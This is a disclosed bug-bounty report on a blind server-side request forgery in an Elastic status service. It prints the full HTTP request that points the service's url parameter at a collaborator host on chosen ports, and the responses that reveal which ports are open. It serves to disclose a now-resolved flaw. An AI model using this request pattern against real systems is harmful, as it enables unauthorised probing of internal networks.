# [M] blind Server-Side Request Forgery (SSRF)  allows scanning internal ports

## Summary
Severity: Medium (CVSS 6.7)
Program: Elastic
Weakness: Server-Side Request Forgery (SSRF)
Reporter: lu3ky-13
State: resolved
Disclosed: 2023-05-05T06:34:31.254Z
Source: https://hackerone.com/reports/1300585

## Details
hello dear support 

I found a Blind SSRF issue that allows scanning internal ports. on https://fleet-status.app.elstc.co

from this issue, you can check the server port 

HTTP request
===========
GET /api/v1/http/default/raw?regex=%22service.name%22:/s*%22(package-registry)%22&statusCodeMax=200&statusCodeMin=200&url=http://p8yfvg6nige7z2ndagpf3v181z7pve.burpcollaborator.net:22 HTTP/1.1
Host: fleet-status.app.elstc.co
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Cache-Control: max-age=0
Te: trailers
Connection: close

if you add port 22 you will get  

{"type":"HTTP-RAW","status":"WARNING","label":"http://p8yfvg6nige7z2ndagpf3v181z7pve.burpcollaborator.net:22","message":"timeout/host unreachable"}


not open  

if you add  port 80 

response 
{"type":"HTTP-RAW","status":"FAILURE","label":"http://p8yfvg6nige7z2ndagpf3v181z7pve.burpcollaborator.net:80","value":{"values":["\u003chtml\u003e\u003cbody\u003eift3z4lojdng3fv7r68q5szjigz\u003c/body\u003e\u003c/html\u003e"],"unit":"RAW"}}

port 80 open

## Impact

_Trimmed to 38 lines — full report: https://hackerone.com/reports/1300585_
